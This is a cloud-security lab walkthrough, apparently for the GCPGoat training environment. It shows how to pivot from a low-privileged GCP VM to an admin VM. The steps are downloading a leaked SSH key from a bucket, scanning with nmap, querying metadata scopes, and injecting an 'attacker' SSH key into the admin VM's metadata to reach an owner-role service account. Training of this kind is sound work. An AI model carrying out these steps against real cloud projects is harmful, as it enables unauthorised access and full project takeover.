In this Part 02 of the lab, we will use the credentials of a low-privileged virtual machine (VM) that we found in the dev bucket. We'll use these credentials to pivot and access higher-privileged compute instances via the low-privileged machine.


### Phase 1: Reconnaissance and Initial Access

#### 1. Explore the Compromised Development Bucket

First, we list the contents of the development bucket that was compromised in the previous lab:


![Development bucket contents showing config.txt file](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-01.png)


We notice that there is an interesting file **config.txt** in the `.ssh` directory. This could contain sensitive information.


#### 2. Retrieve and Analyze Configuration Files

We access the config.txt file from the bucket:

```bash
https://storage.googleapis.com/<DEV BUCKET NAME>/shared/files/.ssh/config.txt

```

![Config file showing IP addresses and user information](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-02.png)

The file contains multiple IP addresses, usernames, and paths to SSH keys.

#### 3. Identify Active Hosts

with Nmap, we scan the IP addresses found in the config file to determine which hosts are accessible:

```bash

nmap <IP_ADDRESS> -Pn

```

![Nmap scan results showing open port 22](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-03.png)

One of the IP addresses has port 22 (SSH) open. From the config file, we can identify this as the instance associated with user **justin**.


#### 4. Retrieve SSH Key

We download the SSH private key for justin, and change the permissions to read-only for the current user only:

```bash

wget https://storage.googleapis.com/<DEV_BUCKET_NAME>/shared/files/.ssh/keys/justin.pem

chmod 400 justin.pem

```

![Downloaded SSH key with proper permissions](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-04.png)

### Phase 2: Initial VM Access and Reconnaissance

#### 5. Connect to the Low-Privileged VM

We use the SSH key to access the VM, and the IP address is the the one corresponding to justin in the config file:

```bash

ssh -i justin.pem justin@<IP_ADDRESS>

```

![Successful SSH connection to the VM](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-05.png)

We logged in successfully as the screen shows.

#### 6. Gather Project Information

Check the VM's service account and project details: 

```bash

gcloud config list

``` 

![gcloud config showing project and account information](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-06.png)


This VM is using the default compute service account, which typically has **Editor** level access but might be restricted by access scopes.

#### 7. Check Service Account Access Scopes

Examine the access scopes applied to the VM:

```bash

curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes \

    -H 'Metadata-Flavor:Google'

```
 

![Service account scopes showing compute and storage access](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-07.png)

The VM has full access to compute services and read access to storage buckets.
 

### Phase 3: Discovery of High-Value Targets  

#### 8. Enumerate Compute Instances

We list all compute instances in the project:
 

```bash

gcloud compute instances list

```
  

![List of compute instances showing admin-vm](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-08.png)  

We've identified another VM named **admin-vm**. Keep the public IP address for this instance, we will need it after. 

We will access this VM by modifying its metadata.

### Phase 4: Privilege Escalation via Metadata Modification 

#### 9. Generate New SSH Key Pair

Create a new SSH key for accessing the admin VM:
 

```bash

ssh-keygen -t rsa -C "attacker" -f ./key -P ""

```
 

![SSH key generation output](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-09.png)

This creates a public key (key.pub) and private key (key) for a user named "attacker".

#### 10. Prepare Metadata Update File

We Create a metadata file with the new SSH key:

```bash

NEWKEY="$(cat ./key.pub)"

echo "attacker:$NEWKEY" > ./meta.txt

cat ./meta.txt  # Verify the contents

```
We store the public key in the **NEWKEY** variable and the we add the **USER:KEY** data to the **meta.txt** file.

![Content of meta.txt file showing SSH key](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-10.png)


#### 11. Update the Admin VM's Metadata

Then, we add the SSH key to the admin VM's metadata, using the below command:  

```bash

gcloud compute instances add-metadata admin-vm --metadata-from-file ssh-keys=meta.txt

```  

![Adding metadata to the admin VM](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-11.png) 

This command will add the content of meta.txt in the ssh-keys section of the instance metadata.

If prompted, confirm the zone selection with **Y**. 

#### 12. Verify Metadata Update

We confirm that the metadata was successfully updated:
 

```bash

gcloud compute instances describe admin-vm --zone us-west1-c

```

![Instance description showing updated SSH keys](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-12.png)
 

The SSH key for user "attacker" should now be visible in the metadata.
 

### Phase 5: Accessing the High-Privileged VM  

#### 13. Connect to the Admin VM 

Use the newly created SSH key to access the admin VM:
 

```bash

ssh -i ./key attacker@<ADMIN_VM_IP> # Replace with the Public IP address of the admin-vm instance

```  

![Successfully connected to admin VM](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-13.png)

We now have access to the admin VM. By default, users added through instance metadata have sudo privileges.  

#### 14. Examine Service Account Privileges 

We check the project and service account details again to make sure:

```bash

gcloud config list

```

![Admin VM service account information](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-14.png)

The admin VM is using a service account named **admin-service-account**.

#### 15. Examine IAM Policies

we check the permissions assigned to this service account:

```bash

gcloud projects get-iam-policy <PROJECT_ID>

```


![IAM policy showing owner role](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-15.png)

The admin service account has the **owner** role on the project, which will grant us full administrative access.

#### 16. Verify API Access Scopes
 

We check the access scopes for the admin VM:

```bash

curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes \

    -H 'Metadata-Flavor:Google'

```

![Scopes showing cloud-platform access](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-16.png)


The VM has the **cloud-platform** scope, which provides full API access to all Google Cloud services.

### Alternative Method for Admin VM Access

#### 17. Direct SSH from Developer VM

We can also use the gcloud command to directly SSH to the admin VM:


```bash

gcloud compute ssh admin-vm

```

This command will add the current user to the admin-vm instance by modifying the metadata.

![Direct SSH access to admin VM](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-17.png)

We are now logged in to the admin-vm with user justin.
